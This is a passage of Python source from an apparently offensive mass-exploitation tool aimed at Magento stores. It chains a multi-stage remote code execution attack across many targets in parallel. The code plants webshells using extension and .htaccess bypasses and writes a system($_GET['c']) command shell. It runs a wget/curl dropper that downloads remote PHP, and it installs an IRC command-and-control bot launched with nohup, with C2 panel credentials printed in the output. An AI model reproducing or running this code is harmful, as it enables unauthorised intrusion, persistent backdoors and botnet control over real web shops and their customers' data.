            # STEP 3: Extension Bypass Testing (ONLY if Steps 1-2 failed)
            # ═══════════════════════════════════════════════════════════
            if not working_shells:
                if VERBOSE:
                    safe_print(f"{Y}[STEP 3]{RST} Testing extension bypasses...")
                
                for ext_idx, ext in enumerate(BYPASS_EXTENSIONS[:15], 1):
                    if VERBOSE:
                        safe_print(f"{Y}[{ext_idx}/15]{RST} Testing extension: {C}{ext}{RST}")
                    
                    base_name = secrets.token_hex(3)
                    filename = f"pub/{base_name}{ext}"  # Write to pub/
                    
                    # Try all PHP payloads for this extension
                    for payload_name, php_code in PHP_PAYLOADS:
                        success, url, output = try_deploy_shell(target, filename, php_code)
                        if success:
                            shell_entry = {'extension': ext, 'payload': payload_name, 'url': url, 'output': output}
                            working_shells.append(shell_entry)
                            if VERBOSE:
                                safe_print(f"{G}[SUCCESS]{RST} Extension {ext} works! Payload: {payload_name}")
                            # Save immediately
                            with result_lock:
                                with open(result_file, 'a') as f:
                                    if len(working_shells) == 1:
                                        f.write(f"{'='*80}\nTarget: {target}\n{'='*80}\n\n")
                                    f.write(f"Method: Extension Bypass\nExtension: {ext}\nPayload: {payload_name}\nURL: {url}\nTest: curl '{url}'\nOutput: {output}\n\n")
                            break  # Move to next extension
                    
                    if len(working_shells) >= 3:
                        break  # Found enough working extensions
            
            target_elapsed = time.time() - target_start
            
            if working_shells:
                with result_lock:
                    rce += 1
                    with open(result_file, 'a') as f:
                        f.write(f"Working Shells: {len(working_shells)} | Time: {target_elapsed:.1f}s\n{'-'*80}\n\n")
                if VERBOSE:
                    safe_print(f"{G}[SUCCESS]{RST} Found {len(working_shells)} working shells ({target_elapsed:.1f}s)")
                else:
                    safe_print(f"{G}[RCE]{RST} {target}")
                return working_shells
            else:
                with result_lock:
                    fail += 1
                safe_print(f"{R}[FAIL]{RST} {target}")
                return None
        
        except Exception as e:
            with result_lock:
                fail += 1
            if VERBOSE:
                safe_print(f"{R}[ERROR]{RST} {target} - {str(e)[:80]}")
            else:
                safe_print(f"{R}[FAIL]{RST} {target}")
            return None
    
    # Parallel testing
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(test_target, idx, target): target for idx, target in enumerate(targets, 1)}
        for future in as_completed(futures):
            pass
    
    total_elapsed = time.time() - start_time
    
    safe_print(f"\n{'='*60}\n{C}COMPLETE{RST}\n{'='*60}")
    safe_print(f"{G}[RCE]{RST}  {rce}\n{R}[FAIL]{RST} {fail}\n")
    safe_print(f"{Y}[TIME]{RST} {total_elapsed:.1f}s total\n")
    if rce > 0:
        safe_print(f"{G}[+]{RST} Results saved: {result_file}\n")

def upload_webshell_mode(targets, vuln_data=None):
    """Mode 5: Upload Full Webshells (Bob + Mage) with threading"""
    safe_print(f"\n{M}[*]{RST} FULL WEBSHELL DEPLOYMENT")
    safe_print(f"{M}[*]{RST} Deploys:")
    safe_print(f"{M}  [1]{RST} Bob Marley File Manager (bob.php)")
    safe_print(f"{M}  [2]{RST} Magento Control Panel (mage.php)")
    safe_print(f"{C}[*]{RST} Testing 50+ extensions until one executes")
    safe_print(f"{C}[*]{RST} Verifying PHP execution (not just file upload)")
    safe_print(f"{C}[*]{RST} Using {THREADS} threads\n")
    
    confirm = input(f"{C}[?]{RST} Deploy full webshells? (y/N): ").strip().lower()
    if confirm != 'y':
        safe_print(f"{Y}[*]{RST} Cancelled\n")
        return
    
    ensure_dir()
    bob_file = f"{OUTPUT_DIR}/Bob_Shells.txt"
    mage_file = f"{OUTPUT_DIR}/Mage_Shells.txt"
    
    result_lock = threading.Lock()
    success, fail = 0, 0
    
    # Download shells from GitHub
    bob_url = "https://raw.githubusercontent.com/khadafigans/Magento-StyleSmuggler/refs/heads/main/bob.php"
    mage_url = "https://raw.githubusercontent.com/khadafigans/Magento-StyleSmuggler/refs/heads/main/mage.php"
    
    bob_code = download_from_github(bob_url, "Bob shell")
    if not bob_code or "<?php" not in bob_code:
        safe_print(f"{R}[!]{RST} Failed to download Bob shell\n")
        return
    
    mage_code = download_from_github(mage_url, "Mage shell")
    if not mage_code or "<?php" not in mage_code:
        safe_print(f"{R}[!]{RST} Failed to download Mage shell\n")
        return
    
    safe_print(f"\n{G}[+]{RST} Shells downloaded successfully\n")
    safe_print(f"{Y}[*]{RST} Starting deployment on {len(targets)} targets...\n")
    
    def deploy_to_target(idx, target):
        nonlocal success, fail
        if VERBOSE:
            safe_print(f"\n{C}[{idx}/{len(targets)}]{RST} {target}")
        
        try:
            deployed = False
            
            # Try each extension
            for ext_idx, ext in enumerate(BYPASS_EXTENSIONS, 1):
                if ext_idx > 15:  # Limit to first 15 for speed
                    break
                
                if VERBOSE:
                    safe_print(f"{Y}[{ext_idx}/15]{RST} Testing extension: {C}{ext}{RST}")
                
                # Random filename
                base_name = f"b_{secrets.token_hex(4)}"
                bob_filename = f"{base_name}{ext}"
                mage_filename = f"{base_name}_mage{ext}"
                marker_file = f"{base_name}_verify.txt"
                unique_marker = f"SHELL_{secrets.token_hex(8)}"
                
                # Create verification payload that uploads bob shell
                bob_b64 = base64.b64encode(bob_code.encode()).decode()
                
                # Try all 5 file write methods for the webshell upload
                write_methods = [
                    ("file_put_contents", 
                     f"file_put_contents(getcwd().chr(47).'{marker_file}','{unique_marker}'.PHP_EOL);"
                     f"file_put_contents(getcwd().chr(47).'{bob_filename}',base64_decode('{bob_b64}'));"
                     f"file_put_contents(getcwd().chr(47).'{marker_file}','Bob:{bob_filename}'.PHP_EOL,FILE_APPEND);"),
                    
                    ("fopen/fwrite",
                     f"$h1=fopen(getcwd().chr(47).'{marker_file}','w');fwrite($h1,'{unique_marker}'.PHP_EOL);fclose($h1);"
                     f"$h2=fopen(getcwd().chr(47).'{bob_filename}','w');fwrite($h2,base64_decode('{bob_b64}'));fclose($h2);"
                     f"$h3=fopen(getcwd().chr(47).'{marker_file}','a');fwrite($h3,'Bob:{bob_filename}'.PHP_EOL);fclose($h3);"),
                    
                    ("SplFileObject",
                     f"$o1=new SplFileObject(getcwd().chr(47).'{marker_file}','w');$o1->fwrite('{unique_marker}'.PHP_EOL);"
                     f"$o2=new SplFileObject(getcwd().chr(47).'{bob_filename}','w');$o2->fwrite(base64_decode('{bob_b64}'));"
                     f"$o3=new SplFileObject(getcwd().chr(47).'{marker_file}','a');$o3->fwrite('Bob:{bob_filename}'.PHP_EOL);"),
                    
                    ("fprintf",
                     f"$h1=fopen(getcwd().chr(47).'{marker_file}','w');fprintf($h1,'%s','{unique_marker}'.PHP_EOL);fclose($h1);"
                     f"$h2=fopen(getcwd().chr(47).'{bob_filename}','w');fprintf($h2,'%s',base64_decode('{bob_b64}'));fclose($h2);"
                     f"$h3=fopen(getcwd().chr(47).'{marker_file}','a');fprintf($h3,'%s','Bob:{bob_filename}'.PHP_EOL);fclose($h3);"),
                    
                    ("copy_data",
                     f"copy('data://text/plain,{unique_marker}',getcwd().chr(47).'{marker_file}');"
                     f"copy('data://text/plain;base64,{bob_b64}',getcwd().chr(47).'{bob_filename}');"
                     f"$h=fopen(getcwd().chr(47).'{marker_file}','a');fwrite($h,'Bob:{bob_filename}'.PHP_EOL);fclose($h);"),
                ]
                
                # TRY ALL FILE WRITE METHODS with fresh poison/cart
                for method_name, payload in write_methods:
                    payload_b64 = base64.b64encode((payload.rstrip() + ";").encode()).decode()
                    
                    # TRY ALL PATHS - fresh poison/cart per path
                    for path in get_paths(target):
                        # Stage 1: Poison FIRST
                        report_id = poison(target)
                        if not report_id:
                            continue
                        
                        # Stage 2: Cart operations AFTER poison
                        cart_id = create_cart(target)
                        if not cart_id:
                            continue
                        
                        set_email(target, cart_id)
                        
                        billing_result = set_billing(target, cart_id)
                        if not billing_result:
                            continue
                        
                        trigger_stage2(target, cart_id, f"{path}/{report_id}", payload_b64)
                        time.sleep(1)
                        
                        # Check marker
                        marker_check = requests.get(f"{target}/{marker_file}", headers=get_bypass_headers(), timeout=5, verify=False)
                        if marker_check.status_code == 200 and unique_marker in marker_check.text:
                            # Marker found! Try multi-URL check like Option 3
                            bob_base = base_name
                            bob_check_urls = [
                                f"{target}/{bob_filename}",
                                f"{target}/pub/{bob_filename}",
                                f"{target}/pub/media/customer_address/{bob_base[0]}/{bob_base[1]}/{bob_filename}",
                                f"{target}/media/customer_address/{bob_base[0]}/{bob_base[1]}/{bob_filename}",
                            ]
                            bob_url_test = None
                            for cu in bob_check_urls:
                                try:
                                    bob_check = requests.get(cu, headers=get_bypass_headers(), timeout=5, verify=False)
                                    if bob_check.status_code == 200 and '<?php' not in bob_check.text[:200]:
                                        panel_ok, panel_reason = verify_panel_shell(cu, 'bob')
                                        if panel_ok:
                                            bob_url_test = cu
                                            break
                                except:
                                    continue

                            if bob_url_test:
                                if VERBOSE:
                                    safe_print(f"{G}[SUCCESS]{RST} Bob executing! [{panel_reason}] ext={ext} method={method_name}")
                                    safe_print(f"{G}  Bob: {bob_url_test}{RST}")
                                else:
                                    safe_print(f"{G}[SUCCESS]{RST} {target}")

                                with result_lock:
                                    success += 1
                                    deployed = True
                                    # Save Bob URL immediately
                                    with open(bob_file, 'a') as f:
                                        f.write(f"{bob_url_test} (method: {method_name})\n")

                                # Deploy Mage using same extension + multi-URL check
                                try:
                                    mage_b64 = base64.b64encode(mage_code.encode()).decode()
                                    mage_payload = f"file_put_contents(getcwd().chr(47).'{mage_filename}',base64_decode('{mage_b64}'))"
                                    mage_payload_b64 = base64.b64encode(mage_payload.encode()).decode()
                                    trigger_stage2(target, cart_id, f"{path}/{report_id}", mage_payload_b64)
                                    time.sleep(1)

                                    mage_check_urls = [
                                        f"{target}/{mage_filename}",
                                        f"{target}/pub/{mage_filename}",
                                        f"{target}/pub/media/customer_address/{bob_base[0]}/{bob_base[1]}/{mage_filename}",
                                        f"{target}/media/customer_address/{bob_base[0]}/{bob_base[1]}/{mage_filename}",
                                    ]
                                    for mcu in mage_check_urls:
                                        try:
                                            mc = requests.get(mcu, headers=get_bypass_headers(), timeout=5, verify=False)
                                            if mc.status_code == 200 and '<?php' not in mc.text[:200]:
                                                mp_ok, mp_reason = verify_panel_shell(mcu, 'mage')
                                                if mp_ok:
                                                    if VERBOSE:
                                                        safe_print(f"{G}  Mage: {mcu} [{mp_reason}]{RST}")
                                                    with result_lock:
                                                        with open(mage_file, 'a') as f:
                                                            f.write(f"{mcu}\n")
                                                    break
                                        except:
                                            continue
                                except:
                                    pass

                                break  # Success - stop trying paths
                        
                        # If marker didn't work, continue to next path
                    
                    # If all paths failed for this method, try next write method
                    if deployed:
                        break  # Success - stop trying write methods
                
                if deployed:
                    break
            
            if not deployed:
                with result_lock:
                    fail += 1
                safe_print(f"{R}[FAIL]{RST} {target}")
            
            return deployed
        
        except Exception as e:
            with result_lock:
                fail += 1
            if VERBOSE:
                safe_print(f"{R}[ERROR]{RST} {target} - {str(e)[:80]}")
            else:
                safe_print(f"{R}[FAIL]{RST} {target}")
            return None
    
    # Parallel deployment
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(deploy_to_target, idx, target): target for idx, target in enumerate(targets, 1)}
        for future in as_completed(futures):
            pass
    
    safe_print(f"\n{'='*60}\n{C}DEPLOYMENT COMPLETE{RST}\n{'='*60}")
    safe_print(f"{G}[SUCCESS]{RST} {success}\n{R}[FAIL]{RST}    {fail}\n")
    if success > 0:
        safe_print(f"{G}[+]{RST} Bob shells: {bob_file}")
        safe_print(f"{G}[+]{RST} Mage shells: {mage_file}\n")

def single_target_mode():
    """Mode 5: Single Target RCE with manual path and payload"""
    global VERBOSE
    print(f"\n{Y}[*]{RST} Single Target RCE Mode\n")
    
    target = input(f"{C}[?]{RST} Target URL (e.g., https://example.com): ").strip()
    if not target.startswith('http'):
        target = 'https://' + target
    
    report_path = input(f"{C}[?]{RST} Report path (e.g., /var/www/html/var/report): ").strip()
    
    verbose_input = input(f"{C}[?]{RST} Verbose mode? (Y/n): ").strip().lower()
    VERBOSE = verbose_input != 'n'
    
    print(f"\n{C}[*]{RST} Payload Options:")
    print(f"{G}[1]{RST} Mini Webshell (Random name)")
    print(f"{G}[2]{RST} Interactive Shell (<?php system(\\$_GET['c']);?>)")
    print(f"{G}[3]{RST} Dropper - wget mage.php (reports to .txt)")
    print(f"{G}[4]{RST} Custom PHP Code (paste your code)")
    
    payload_choice = input(f"{C}[?]{RST} Select payload: ").strip()
    
    # Initialize variables for later use
    unique_marker = None
    dropper_name = None
    shell_name = None
    
    if payload_choice == '1':
        # Mini webshell download with RANDOM name - USE WGET/CURL FALLBACK
        shell_url = "https://raw.githubusercontent.com/khadafigans/Magento-StyleSmuggler/refs/heads/main/mini.php"
        shell_name = f"mini_{secrets.token_hex(6)}.php"
        print(f"\n{C}[*]{RST} Will save as: {shell_name}")
        
        mini_php = download_from_github(shell_url, "mini.php")
        if not mini_php:
            print(f"{R}[!]{RST} Failed to download mini.php")
            return
        
        # Base64 encode the entire mini.php
        mini_b64 = base64.b64encode(mini_php.encode()).decode()
        payload = f"file_put_contents(getcwd().chr(47).'{shell_name}',base64_decode('{mini_b64}'))"
        print(f"{G}[+]{RST} Mini.php ready ({len(mini_php)} bytes)")
    
    elif payload_choice == '2':
        # Interactive shell with directory + .htaccess bypass
        random_dir = f"cache_{secrets.token_hex(6)}"
        shell_name = f"s_{secrets.token_hex(6)}.php"
        marker_name = f"bob_{secrets.token_hex(6)}.txt"
        unique_marker = f"SHELL_RUN_{secrets.token_hex(12)}"
        
        print(f"\n{Y}[*]{RST} Directory Bypass Configuration:")
        print(f"  Directory: {C}{random_dir}/{RST}")
        print(f"  Shell: {C}{random_dir}/{shell_name}{RST}")
        print(f"  Marker: {C}{marker_name}{RST}")
        print(f"  Verification: {C}{unique_marker}{RST}")
        
        # .htaccess to enable PHP execution - use chr(10) for REAL newlines!
        htaccess = "AddHandler application/x-httpd-php .php'.chr(10).'AddType application/x-httpd-php .php'.chr(10).'<FilesMatch \\\\.php$>'.chr(10).'SetHandler application/x-httpd-php'.chr(10).'</FilesMatch>"
        
        # Wrap with marker like style-poc-random.py
        payload = (
            f"file_put_contents(getcwd().chr(47).'{marker_name}','{unique_marker}'.PHP_EOL);"
            f"@mkdir(getcwd().chr(47).'{random_dir}',0755,true);"
            f"file_put_contents(getcwd().chr(47).'{random_dir}'.chr(47).'.htaccess','{htaccess}');"
            f"file_put_contents(getcwd().chr(47).'{random_dir}'.chr(47).'{shell_name}','<?php system(\\$_GET[\"c\"]);?>');"
            f"file_put_contents(getcwd().chr(47).'{marker_name}','[Shell URL]'.PHP_EOL.'{random_dir}/{shell_name}?c=id'.PHP_EOL.'[Directory]'.PHP_EOL.shell_exec('ls -la {random_dir} 2>&1'),FILE_APPEND)"
        )
        # Set shell_name to marker for verification
        shell_name = marker_name
    
    elif payload_choice == '3':
        # Dropper - wget/curl mage.php with FALLBACK
        shell_url = "https://raw.githubusercontent.com/khadafigans/Magento-StyleSmuggler/refs/heads/main/mage.php"
        
        # Generate random names for stealth
        dropper_name = f"bob_{secrets.token_hex(6)}.txt"
        shell_name = f"mage_{secrets.token_hex(6)}.php"
        unique_marker = f"DROPPER_RUN_{secrets.token_hex(12)}"
        
        print(f"\n{Y}[*]{RST} Dropper Configuration:")
        print(f"  Dropper file: {C}{dropper_name}{RST}")
        print(f"  Shell file: {C}{shell_name}{RST}")
        print(f"  Unique marker: {C}{unique_marker}{RST}")
        print(f"\n{Y}[*]{RST} Dropper will:")
        print(f"  1. Verify execution with unique marker")
        print(f"  2. Report working directory")
        print(f"  3. wget/curl mage.php as {shell_name}")
        print(f"  4. Show download result")
        print(f"  5. List and verify shell file")
        
        # Build dropper payload with wget/curl fallback
        payload = (
            f"file_put_contents(getcwd().chr(47).'{dropper_name}',"
            f"'{unique_marker}'.PHP_EOL."
            f"'[StyleSmuggler Dropper Report - MAGE.PHP]'.PHP_EOL."
            f"'Working Directory: '.getcwd().PHP_EOL."
            f"'Timestamp: '.date('Y-m-d H:i:s').PHP_EOL."
            f"'User: '.shell_exec('whoami 2>&1').PHP_EOL.PHP_EOL."
            f"'[Downloading mage.php as {shell_name}]'.PHP_EOL."
            f"shell_exec('wget {shell_url} -O {shell_name} 2>&1 || curl -o {shell_name} {shell_url} 2>&1').PHP_EOL.PHP_EOL."
            f"'[Verification]'.PHP_EOL."
            f"shell_exec('ls -la {shell_name} 2>&1').PHP_EOL."
            f"shell_exec('file {shell_name} 2>&1').PHP_EOL."
            f"shell_exec('pwd 2>&1'))"
        )
    
    elif payload_choice == '4':
        # Custom PHP - Accept FULL PHP source code (can paste entire files)
        marker_name = f"bob_{secrets.token_hex(6)}.txt"
        unique_marker = f"CUSTOM_RUN_{secrets.token_hex(12)}"
        
        print(f"\n{Y}[*]{RST} Custom PHP Code Mode")
        print(f"{C}[INFO]{RST} You can paste:")
        print(f"  - Single line code: file_put_contents('test.txt','data')")
        print(f"  - Multiple lines (paste entire PHP file)")
        print(f"  - End with a blank line or type 'END' to finish")
        print(f"{Y}[*]{RST} Enter your PHP code (without <?php tags):")
        
        lines = []
        while True:
            try:
                line = input()
                if line.strip().upper() == 'END' or (not line.strip() and lines):
                    break
                lines.append(line)
            except EOFError:
                break
        
        custom_code = '\n'.join(lines).strip()
        
        if not custom_code:
            print(f"{R}[!]{RST} No code provided!")
            return
        
        # Ask for output filename (the file created by user's code)
        shell_name = input(f"\n{C}[?]{RST} What filename will your code create? (for verification): ").strip()
        
        print(f"\n{C}[*]{RST} Code size: {len(custom_code)} bytes")
        print(f"{C}[*]{RST} Marker: {marker_name}")
        print(f"{C}[*]{RST} Will verify: {shell_name}")
        
        # Wrap custom code with marker - escape for payload
        custom_code_escaped = custom_code.replace("'", "\\'").replace('"', '\\"')
        
        # Wrap custom code with marker verification
        payload = (
            f"file_put_contents(getcwd().chr(47).'{marker_name}','{unique_marker}'.PHP_EOL);"
            f"eval(base64_decode('{ base64.b64encode(custom_code.encode()).decode() }'));"
            f"file_put_contents(getcwd().chr(47).'{marker_name}','[Custom code executed]'.PHP_EOL,FILE_APPEND)"
        )
        
        # If no shell_name provided, check marker only
        if not shell_name:
            shell_name = marker_name
    
    else:
        print(f"{R}[!]{RST} Invalid choice")
        return
    
    print(f"\n{Y}[*]{RST} Starting exploit...")
    
    try:
        # Stage 1
        report_id = poison(target)
        if not report_id:
            print(f"{R}[!]{RST} Stage 1 failed - no report ID")
            return
        
        # Stage 2
        cart_id = create_cart(target)
        if not cart_id:
            print(f"{R}[!]{RST} Failed to create cart")
            return
        
        set_email(target, cart_id)
        
        billing_result = set_billing(target, cart_id)
        if VERBOSE:
            print(f"{C}[DEBUG]{RST} Billing set result: {billing_result}")
        
        if not billing_result:
            print(f"{R}[!]{RST} Failed to set billing address")
            return
        
        # Trigger RCE
        payload_b64 = base64.b64encode((payload.rstrip() + ";").encode()).decode()
        full_report_path = f"{report_path}/{report_id}"
        
        print(f"{C}[*]{RST} Triggering RCE with report: {full_report_path}")
        if VERBOSE:
            print(f"{C}[DEBUG]{RST} Payload size: {len(payload)} bytes")
            print(f"{C}[DEBUG]{RST} Base64 size: {len(payload_b64)} bytes")
            print(f"{C}[DEBUG]{RST} Payload preview: {payload[:200]}...")
            print(f"{C}[DEBUG]{RST} cart_id BEFORE trigger_stage2: {repr(cart_id)}")
            print(f"{C}[DEBUG]{RST} cart_id type: {type(cart_id)}")
        
        result = trigger_stage2(target, cart_id, full_report_path, payload_b64)
        
        time.sleep(2)
        
        # Verify - for dropper check dropper.txt, otherwise check shell_name
        if payload_choice == '3':
            check_url = f"{target}/{dropper_name}"
        else:
            check_url = f"{target}/{shell_name}"
        
        print(f"\n{C}[*]{RST} Checking: {check_url}")
        
        check_resp = requests.get(check_url, headers=get_bypass_headers(), timeout=10, verify=False)
        
        if check_resp.status_code == 200:
            # CRITICAL: Check if PHP is EXECUTING, not just if file exists!
            if '<?php' in check_resp.text[:200]:
                print(f"\n{R}[✗] FAILED!{RST}")
                print(f"{R}File uploaded but NOT executing (server shows PHP source code){RST}")
                print(f"{Y}[?]{RST} The file exists but Apache/Nginx is not executing PHP")
                print(f"{Y}[?]{RST} Try different payload or check server config")
                return
            
            # If no PHP source visible, it's executing!
            print(f"\n{G}[✓] RCE SUCCESSFUL!{RST}")
            print(f"{C}Shell URL:{RST} {check_url}")
            
            if payload_choice == '2':
                print(f"\n{Y}[*]{RST} Usage: {check_url}?c=id")
                print(f"{Y}[*]{RST} Test:")
                test = requests.get(f"{check_url}?c=id", headers=get_bypass_headers(), timeout=5, verify=False)
                if test.status_code == 200:
                    print(f"{G}{test.text[:200]}{RST}")
            
            elif payload_choice == '3':
                # Dropper - read the report and check marker
                print(f"\n{Y}[*]{RST} Dropper Report:")
                print(f"{C}{'='*60}{RST}")
                
                # Check if marker is in response
                if unique_marker in check_resp.text:
                    print(f"{G}[✓] Unique marker verified: {unique_marker}{RST}")
                else:
                    print(f"{R}[!] Marker NOT found - might be cached response{RST}")
                
                print(check_resp.text)
                print(f"{C}{'='*60}{RST}")
                
                # Check if shell exists
                time.sleep(2)
                shell_check = requests.get(f"{target}/{shell_name}", headers=get_bypass_headers(), timeout=5, verify=False)
                if shell_check.status_code == 200:
                    print(f"\n{G}[✓] Shell downloaded successfully!{RST}")
                    print(f"{C}Shell URL:{RST} {target}/{shell_name}")
                    print(f"{Y}[*]{RST} Access mini.php webshell interface")
                else:
                    print(f"\n{Y}[?]{RST} Shell not found at root, check dropper report for location")
                    print(f"{Y}[?]{RST} Try: {target}/pub/{shell_name}")
            
            elif payload_choice == '1':
                print(f"{Y}[*]{RST} Mini webshell uploaded!")
                print(f"{Y}[*]{RST} Access at: {check_url}")
            
            # Save to results
            ensure_dir()
            with open(f"{OUTPUT_DIR}/single_rce.txt", 'a') as f:
                f.write(f"\nTarget: {target}\n")
                f.write(f"Shell: {check_url}\n")
                f.write(f"Report Path: {full_report_path}\n")
                f.write(f"Time: {datetime.now()}\n")
                f.write(f"{'-'*60}\n")
            
        else:
            print(f"\n{R}[✗] Failed{RST} - HTTP {check_resp.status_code}")
            print(f"{Y}[?]{RST} Shell might be in different location")
            print(f"{Y}[?]{RST} Try checking: {target}/pub/{shell_name}")
        
    except Exception as e:
        print(f"\n{R}[!]{RST} Error: {e}")


    print(f"{M}{'='*60}{RST}\n")

# ==================== IRC BOT DEPLOYMENT ====================
def irc_bot_mode(targets, vuln_data):
    """Deploy IRC C2 bot - GSocket style all-in-one payload"""
    print(f"\n{M}{'='*60}{RST}")
    print(f"{M}[*] IRC C2 BOT DEPLOYMENT{RST}")
    print(f"{M}{'='*60}{RST}\n")
    
    print(f"{Y}[*]{RST} IRC: 192.168.1.0:6667 | Channel: #mg_master")
    print(f"{Y}[*]{RST} Bot: https://raw.githubusercontent.com/khadafigans/Magento-StyleSmuggler/refs/heads/main/irc.php")
    print(f"{Y}[*]{RST} Style: GSocket all-in-one (3 download + 5 exec + 5 write)\n")
    
    # Constants
    BOT_URL = "https://raw.githubusercontent.com/khadafigans/Magento-StyleSmuggler/refs/heads/main/irc.php"
    BOT_FILE = "cache.php"
    MARKER_FILE = "update.txt"
    
    # GSocket-style payload: wget/curl/file_get_contents + 5 exec primitives + 5 write methods
    payload_php = f"""
$_x=null;
foreach(array('shell_exec','exec','system','passthru','popen') as $_f){{
    if(function_exists($_f)&&!in_array($_f,array_map('trim',explode(',',ini_get('disable_functions'))))){{
        $_x=$_f;break;
    }}
}}

$url='{BOT_URL}';
$bot_file='{BOT_FILE}';
$got=false;

if($_x){{
    $_r=$_x('wget -qO '.$bot_file.' "'.$url.'" 2>&1 && echo OK');
    if(strpos((string)$_r,'OK')!==false)$got=true;
}}

if(!$got&&$_x){{
    $_r=$_x('curl -s -o '.$bot_file.' "'.$url.'" 2>&1 && echo OK');
    if(strpos((string)$_r,'OK')!==false)$got=true;
}}

if(!$got){{
    $_ctx=stream_context_create(array('http'=>array('timeout'=>30,'follow_location'=>1)));
    $_c=@file_get_contents($url,false,$_ctx);
    if($_c!==false&&strlen($_c)>100){{
        file_put_contents($bot_file,$_c);
        $got=true;
    }}
}}

$out='';
if($got){{
    $full_path=getcwd().chr(47).$bot_file;
    
    if($_x==='popen'){{
        $h=popen('nohup php '.$full_path.' > /dev/null 2>&1 &','r');
        $out='Executed via popen';
        pclose($h);
    }}
    elseif($_x){{
        $out=(string)$_x('nohup php '.$full_path.' > /dev/null 2>&1 & echo EXEC_OK');
    }}
    else{{
        $out='EXEC_DISABLED';
    }}
    
    $body='IRC BOT DEPLOYED'.chr(10);
    $body.='Bot: '.substr(md5($_SERVER['HTTP_HOST']??gethostname()),0,4).chr(10);
    $body.='File: '.$full_path.chr(10);
    $body.='Download: SUCCESS'.chr(10);
    $body.='Exec: '.$_x.chr(10);
    $body.='Output: '.$out;
    
    foreach(array('{MARKER_FILE}','../{MARKER_FILE}') as $marker){{
        @file_put_contents($marker,$body);
        if($fp=@fopen($marker,'w')){{@fwrite($fp,$body);@fclose($fp);}}
        if(class_exists('SplFileObject')){{try{{$spl=new SplFileObject($marker,'w');$spl->fwrite($body);}}catch(Exception $e){{}}}}
        if($fp=@fopen($marker,'w')){{@fprintf($fp,'%s',$body);@fclose($fp);}}
        @copy('data://text/plain;base64,'.base64_encode($body),$marker);
    }}
}}
else{{
    $fail_msg='DOWNLOAD_FAILED exec='.$_x;
    foreach(array('{MARKER_FILE}','../{MARKER_FILE}') as $marker){{
        @file_put_contents($marker,$fail_msg);
        if($fp=@fopen($marker,'w')){{@fwrite($fp,$fail_msg);@fclose($fp);}}
    }}
}}
"""
    
    results_dir = f"Result_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    os.makedirs(results_dir, exist_ok=True)
    success_file = os.path.join(results_dir, "IRC_Bots.txt")
    
    with open(success_file, 'w') as f:
        f.write("="*60 + "\n")
        f.write("IRC C2 BOT DEPLOYMENT\n")
        f.write("="*60 + "\n")
        f.write("IRC: 192.168.1.0:6667\n")
        f.write("Channel: #mg_master\n")
        f.write(f"Bot File: {BOT_FILE}\n")
        f.write(f"Marker: {MARKER_FILE}\n")
        f.write("="*60 + "\n\n")
    
    success_count = 0
    failed_count = 0
    
    # Threading like GSocket
    from concurrent.futures import ThreadPoolExecutor, as_completed
    
    def deploy_to_target(target_url):
        try:
            domain = urllib.parse.urlparse(target_url).netloc
            safe_print(f"\n{C}[→]{RST} {domain}")
            
            vdata = vuln_data.get(target_url, {})
            report_path = vdata.get('path', '/var/report')
            
            cart_id = create_cart(target_url)
            if not cart_id:
                safe_print(f"  {R}[✗]{RST} Cart failed")
                return ("FAILED", domain, None, "Cart failed")
            
            set_email(target_url, cart_id)
            set_billing(target_url, cart_id)
            
            report_id = poison(target_url)
            if not report_id:
                safe_print(f"  {R}[✗]{RST} Poison failed")
                return ("FAILED", domain, None, "Poison failed")
            
            cart_id2 = create_cart(target_url)
            if not cart_id2:
                safe_print(f"  {R}[✗]{RST} 2nd cart failed")
                return ("FAILED", domain, None, "2nd cart failed")
            
            set_email(target_url, cart_id2)
            set_billing(target_url, cart_id2)
            
            payload_b64 = base64.b64encode(payload_php.encode()).decode()
            full_report_path = f"{report_path}/{report_id}"
            
            safe_print(f"  {C}[*]{RST} Deploying...")
            trigger_stage2_with_retry(target_url, cart_id2, full_report_path, payload_b64)
            
            time.sleep(5)
            
            # Check marker (dual /pub/ + root)
            marker_found = False
            marker_url = None
            marker_content = None
            
            for check_url in [f"{target_url}/pub/{MARKER_FILE}", f"{target_url}/{MARKER_FILE}"]:
                try:
                    resp = requests.get(check_url, headers=get_bypass_headers(), timeout=10, verify=False)
                    if resp.status_code == 200:
                        marker_found = True
                        marker_url = check_url
                        marker_content = resp.text
                        break
                except:
                    continue
            
            if marker_found:
                if 'IRC BOT DEPLOYED' in marker_content:
                    bot_nick = None
                    for line in marker_content.split('\n'):
                        if line.startswith('Bot:'):
                            bot_nick = f"bot_{line.split(':')[1].strip()}"
                            break
                    
                    safe_print(f"  {G}[✓]{RST} SUCCESS! Marker: {marker_url}")
                    if bot_nick:
                        safe_print(f"  {G}[✓]{RST} Nick: {bot_nick}")
                    
                    return ("SUCCESS", domain, marker_url, marker_content)
                else:
                    safe_print(f"  {R}[✗]{RST} Marker shows failure")
                    return ("FAILED", domain, marker_url, marker_content)
            else:
                safe_print(f"  {Y}[!]{RST} No marker (check IRC)")
                return ("UNKNOWN", domain, None, "No marker")
                
        except Exception as e:
            safe_print(f"  {R}[✗]{RST} {e}")
            return ("FAILED", domain, None, str(e))
    
    safe_print(f"{Y}[*]{RST} Deploying to {len(targets)} targets ({THREADS} threads)...\n")
    
    results = []
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        future_to_target = {executor.submit(deploy_to_target, t): t for t in targets}
        
        for future in as_completed(future_to_target):
            try:
                result = future.result()
                results.append(result)
                
                status, domain, marker_url, content = result
                if status == "SUCCESS":
                    success_count += 1
                    with open(success_file, 'a') as f:
                        f.write(f"\n[SUCCESS] {domain}\n")
                        f.write(f"  Marker: {marker_url}\n")
                        for line in (content or "").split('\n'):
                            f.write(f"    {line}\n")
                        f.write(f"  Time: {datetime.now()}\n")
                        f.write("-"*60 + "\n")
                else:
                    failed_count += 1
            except Exception as e:
                failed_count += 1
    
    print(f"\n{M}{'='*60}{RST}")
    print(f"{G}[✓] COMPLETE!{RST}")
    print(f"  Success: {G}{success_count}{RST} | Failed: {R}{failed_count}{RST} | Total: {len(targets)}")
    print(f"\n{Y}Results:{RST} {success_file}")
    print(f"\n{C}IRC WEB:{RST} http://192.168.1.0:8888")
    print(f"  User: adminbob | Pass: Kontolodon123@")
    print(f"\n{C}Commands:{RST}")
    print(f"  !list                - List bots")
    print(f"  !cmd@all whoami      - Execute on all")
    print(f"  !cmd@bot_xxxx ls -la - Execute on one")
    print(f"{M}{'='*60}{RST}\n")

